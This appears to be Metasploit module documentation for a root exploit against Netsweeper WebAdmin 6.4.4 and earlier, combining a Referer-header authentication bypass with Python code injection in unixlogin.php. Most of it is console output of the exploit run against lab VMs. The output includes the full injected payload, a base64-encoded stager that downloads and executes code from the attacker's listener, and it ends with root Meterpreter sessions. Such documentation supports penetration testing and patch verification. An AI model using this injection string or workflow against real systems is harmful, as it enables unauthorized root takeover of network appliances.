## Vulnerable Application

### Description

This module exploits a Python code injection in the Netsweeper
WebAdmin component's `unixlogin.php` script, for versions 6.4.4 and
prior, to execute code as the root user.

Authentication is bypassed by sending a random whitelisted `Referer`
header in each request.

Tested on the CentOS Linux-based Netsweeper 6.4.3 and 6.4.4 ISOs.
Though the advisory lists 6.4.3 and prior as vulnerable, 6.4.4 has
been confirmed exploitable.

### Setup

1. Download the [Netsweeper 6.4.3
   ISO](https://repo.netsweeper.com/netsweeper-el6-x86_64-6.4.3-1.iso)
2. Boot from the ISO as a DVD in your preferred virtualization software
3. Install the system as per the guided prompts

The system is based on CentOS Linux 6, and you may consult CentOS 6
documentation for guidance on the installation process.

The default credentials for WebAdmin are `admin:netsweeper` if you need
to log in to the web interface. This is not required for exploitation.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This executes a Python payload.

## Scenarios

### Netsweeper 6.4.3 ISO, based on CentOS Linux

```
msf5 > use exploit/linux/http/netsweeper_webadmin_unixlogin
msf5 exploit(linux/http/netsweeper_webadmin_unixlogin) > options

Module options (exploit/linux/http/netsweeper_webadmin_unixlogin):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (python/meterpreter/reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Python


msf5 exploit(linux/http/netsweeper_webadmin_unixlogin) > set rhosts 172.16.249.157
rhosts => 172.16.249.157
msf5 exploit(linux/http/netsweeper_webadmin_unixlogin) > set lhost 172.16.249.1
lhost => 172.16.249.1
msf5 exploit(linux/http/netsweeper_webadmin_unixlogin) > run

[*] Started HTTPS reverse handler on https://172.16.249.1:8443
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Netsweeper 6.4.3 is a vulnerable version.
[*] Selecting random whitelisted Referer header: webadmin/api/
[*] Injecting Python code into password field: 0IonGkMXLHAz6WEurtI51ymUIkdaTIbP48wmlbCg7', 'd6'); exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnSFRUUFNIYW5kbGVyJ10pCmhzPVtdCmlmICh2aVswXT09MiBhbmQgdmk+PSgyLDcsOSkpIG9yIHZpPj0oMyw0LDMpOgoJaW1wb3J0IHNzbAoJc2M9c3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKCXNjLmNoZWNrX2hvc3RuYW1lPUZhbHNlCglzYy52ZXJpZnlfbW9kZT1zc2wuQ0VSVF9OT05FCglocy5hcHBlbmQodWwuSFRUUFNIYW5kbGVyKDAsc2MpKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cHM6Ly8xNzIuMTYuMjQ5LjE6ODQ0My9YSDc1NmxXSnBQbjlUT2hZb19iT01BSldYQmRROScpLnJlYWQoKSkK')[0])) #
[*] Sending python/meterpreter/reverse_https to https://172.16.249.157/webadmin/tools/unixlogin.php
[*] https://172.16.249.1:8443 handling request from 172.16.249.157; (UUID: xvp5ei8z) Staging python payload (53935 bytes) ...
[*] Meterpreter session 1 opened (172.16.249.1:8443 -> 172.16.249.157:54130) at 2020-05-12 00:26:22 -0500

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer        : localhost.localdomain
OS              : Linux 2.6.32-754.25.1.el6.x86_64 #1 SMP Mon Dec 23 15:19:53 UTC 2019
Architecture    : x64
System Language : C
Meterpreter     : python/linux
meterpreter >
```

### Netsweeper 6.4.4 ISO, based on CentOS Linux

```
msf5 exploit(linux/http/netsweeper_webadmin_unixlogin) > set rhosts 172.16.249.160
rhosts => 172.16.249.160
msf5 exploit(linux/http/netsweeper_webadmin_unixlogin) > run

[*] Started HTTPS reverse handler on https://172.16.249.1:8443
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Netsweeper 6.4.4 is a vulnerable version.
[*] Selecting random whitelisted Referer header: webadmin/systemconfig/edit_email_sending_settings.php
[*] Injecting Python code into password field: 7Ot5EJTCtZeprAkH36J9t2Equy8', 'oL'); exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnSFRUUFNIYW5kbGVyJ10pCmhzPVtdCmlmICh2aVswXT09MiBhbmQgdmk+PSgyLDcsOSkpIG9yIHZpPj0oMyw0LDMpOgoJaW1wb3J0IHNzbAoJc2M9c3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKCXNjLmNoZWNrX2hvc3RuYW1lPUZhbHNlCglzYy52ZXJpZnlfbW9kZT1zc2wuQ0VSVF9OT05FCglocy5hcHBlbmQodWwuSFRUUFNIYW5kbGVyKDAsc2MpKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cHM6Ly8xNzIuMTYuMjQ5LjE6ODQ0My9KMFVhZjBVVzFic2lWemREZk8wUjdnVTZCUVBRYycpLnJlYWQoKSkK')[0])) #
[*] Sending python/meterpreter/reverse_https to https://172.16.249.160/webadmin/tools/unixlogin.php
[*] https://172.16.249.1:8443 handling request from 172.16.249.160; (UUID: bh9jykhb) Staging python payload (53873 bytes) ...
[*] Meterpreter session 2 opened (172.16.249.1:8443 -> 172.16.249.160:49172) at 2020-05-12 00:27:22 -0500

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer        : localhost.localdomain
OS              : Linux 2.6.32-754.25.1.el6.x86_64 #1 SMP Mon Dec 23 15:19:53 UTC 2019
Architecture    : x64
System Language : C
Meterpreter     : python/linux
meterpreter >
```
